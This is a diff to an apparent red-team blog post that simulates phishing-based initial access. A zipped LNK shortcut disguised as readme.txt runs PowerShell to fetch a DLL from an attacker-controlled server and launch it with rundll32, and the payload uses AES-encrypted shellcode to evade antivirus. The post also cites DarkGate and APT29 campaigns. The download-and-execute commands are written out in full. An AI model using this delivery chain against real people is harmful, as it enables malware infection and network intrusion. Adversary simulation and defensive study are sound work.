@@ -35,6 +35,7 @@ In addition, threat actors frequently exploit vulnerabilities present in public-
 However, the effectiveness of these access points might diminish due to changing passwords or other security measures. 
 Analyzing historical attacks by prominent threat actors reveals that these tactics are recurrently employed to breach networks, underscoring the significance of robust initial access security measures."
 
+In a recent [DarkGate Loader campain](https://www.truesec.com/hub/blog/darkgate-loader-delivered-via-teams) theat actors abused the Microsoft Teams tools to spread malware leveraging messages sent from two external Office 365 accounts compromised prior to the campaign. The message content aimed to social engineer the recipients into downloading and opening a malicious file hosted remotely.
 
  
 
@@ -45,8 +46,8 @@ Analyzing historical attacks by prominent threat actors reveals that these tacti
 We are not going into details on how we created this stealth DLL payload in this blogpost. 
 Is it obviously possible to used any payload you want, the only assumption is that the paylod itself must be undetected by Defender AV and static signature. 
 The DLL itself is pretty simple and perform the classic injection using the VirtualAlloc Windows API. 
-However, to bypass static signature, the shellcode is encrypted with AES. 
-Inside the DLL we have also included the AES Key to decrypt the shellcode as well as the AES Decryption. 
+However, to bypass static signature, the shellcode is encrypted with AES, functions and relevant strings were renamed.
+Inside the DLL we have also included the AES Key to decrypt the shellcode as well as the AES Decryption. Please note that in this case the AES Key is hardcoded inside the malware.  
 
 __Note:__ Since we are saving a payload into the disk we don't need to worry about AMSI at this stage. We are not operating in memory even though this can be considered not OPSEC safe. 
 
@@ -54,7 +55,7 @@ __Note:__ Since we are saving a payload into the disk we don't need to worry abo
 
 ## 3) Weaponize Payload Delivery with LNK 
 
-Firt of all we need to create a shortcut file that will be delivered with the encrypted PDF. Right click on your Desktop, click on create shortcut and you must enter the full path of `cmd.exe`, in this case it will be `C:\Windows\System32\cmd.exe`. 
+Firt of all we need to create a shortcut file that will be delivered in the `zip` folder with the encrypted PDF. Right click on your Desktop, click on create shortcut and you must enter the full path of `cmd.exe`, in this case it will be `C:\Windows\System32\cmd.exe`. 
 
 <p align="center">
   <img src="/assets/posts/2022-06-01-Initial-Access-Simulation/lnk.PNG">
@@ -77,7 +78,7 @@ C:\Windows\System32\cmd.exe /c powershell.exe wget http://192.168.133.152:1234/h
 ```
 __Note:__ The powershell download can be also be performed with the usual suspect IEX Download String function. 🚩
 
-Futhermore, the above command is included inside the readme.txt.lnk file which will look like this to the end user. 
+Furthermore, the above command is included inside the readme.txt.lnk file which will look like this to the end user. 
 
 Below we can see the files that will be displayed to the user after unziping the `.zip` folder delivered via email or when possible via Microsft Teams. 
 
@@ -91,7 +92,9 @@ __Note:__ Obviously we can create a .lnk file with the desired command and subse
   <img src="/assets/posts/2022-06-01-Initial-Access-Simulation/lnk3.PNG">
 </p>
 
-Upon executing the `readme.txt` file on the attacker machine we can see a web request on the webserver. 
+
+
+Upon executing the `readme.txt` file on the victim machine we can see a web request made on the attacker controlled webserver. 
 
 <p align="center">
   <img src="/assets/posts/2022-06-01-Initial-Access-Simulation/down.JPG">
@@ -110,22 +113,29 @@ With some modification on the `.dll` file we can also perform the same activity 
 ```powershell 
 C:\Windows\System32\cmd.exe /c powershell.exe wget http://192.168.133.152:1234/h.dll -OutFile %TMP%\h.dll && rundll32 %TMP%\h.dll,helo
 ```
-The command is pretty similar even though in this case we need to specify the export function name declared in our `.dll`
+The command is pretty similar even though in this case we need to specify the export function name declared in our `.dll` (helo)
 
-Below is a quick video demonstrating our initial access scenario.
-
-<video src="/assets/posts/2022-06-01-Initial-Access-Simulation/hvc1.mp4" controls="controls" style="max-width: 1000px;">
+<video src="/assets/posts/2022-06-01-Initial-Access-Simulation/hvc1.mp4" controls="controls" style="max-width: 730px;">
 </video>
 
 
 
 ## 4) Conclusion and Limitation
 
-- Email gateway scanner 
-- Proxy communications 
-- PackMyPayload https://github.com/mgeeky/PackMyPayload
+
+In a recent malware campaing analyzed by the Unit42 of Palo Alto corporation a threat acrors were identified abusing similar TTP's. Specifically, this sample was packaged as a self-contained ISO. Included in the ISO was a Windows shortcut (LNK) file, a malicious payload DLL and a legitimate copy of Microsoft OneDrive Updater. 
+
+This unique sample was packaged in a manner consistent with known APT29 techniques and their recent campaigns, which leveraged well-known cloud storage and online collaboration applications. Specifically, this sample was packaged as a self-contained ISO. Included in the ISO was a Windows shortcut (LNK) file, a malicious payload DLL and a legitimate copy of Microsoft OneDrive Updater. Attempts to execute the benign application from the ISO-mounted folder resulted in the loading of the malicious payload as a dependency through a technique known as DLL search order hijacking. However, while packaging techniques alone are not enough to definitively attribute this sample to APT29, these techniques demonstrate that users of the tool are now applying nation-state tradecraft to deploy BRc4. 
+
+For further reading you can refer to these two well detailed blog posts regarding APT 29 and their possibile relevant activities. 
+
+- [Palo Alto](https://unit42.paloaltonetworks.com/brute-ratel-c4-tool/)
+- [Yoroi](https://yoroi.company/research/how-an-apt-technique-turns-to-be-a-public-red-team-project/)
+
 
 
 ## References 
 
 - https://www.truesec.com/hub/blog/darkgate-loader-delivered-via-teams
+
+- PackMyPayload https://github.com/mgeeky/PackMyPayload
